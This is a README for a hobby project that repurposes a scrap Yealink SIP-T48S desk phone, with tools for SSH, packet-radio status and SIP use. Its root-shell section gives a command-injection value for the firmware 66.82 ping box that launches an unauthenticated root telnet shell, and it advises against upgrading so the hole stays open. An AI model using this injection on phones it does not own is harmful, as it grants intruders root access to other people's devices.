# yealink-t48s

Custom software for a scrap Yealink SIP-T48S desk phone. A toy to use for whatever: SSH into it, show packet-radio status (for example the connections open on GB7RDG), and keep it working as a SIP phone.

Where things stand and what's next: [docs/status.md](docs/status.md).

## Layout

- `tools/` - Python helpers run from a Linux box on the same network
  - `ylweb.py` - client for the new HTTPS web UI (66.84 and later)
  - `ylweb82.py` - client for the old HTTP web UI (66.82)
  - `diag82.py` - runs a shell command as root through the 66.82 ping box
  - `tsh.py` - runs commands over the root telnet shell
  - `push.py` - copies a file to the phone
  - `phonecfg.py` - phone address; reads the web login from `~/.config/yealink-t48s/web-login` (`user:password`) or `T48S_LOGIN`
- `native/` - programs for the phone, built with clang (`make`)
- `docs/` - notes
- `shots/`, `frames/` - screenshots and test frames

## Getting a root shell (after every phone reboot)

```sh
cd tools
python3 diag82.py '127.0.0.1 -c 1;/usr/sbin/telnetd -p 2323 -l /bin/sh'
python3 tsh.py 'id'
```

Never upgrade the phone's firmware: 66.84 and later close the hole this relies on.
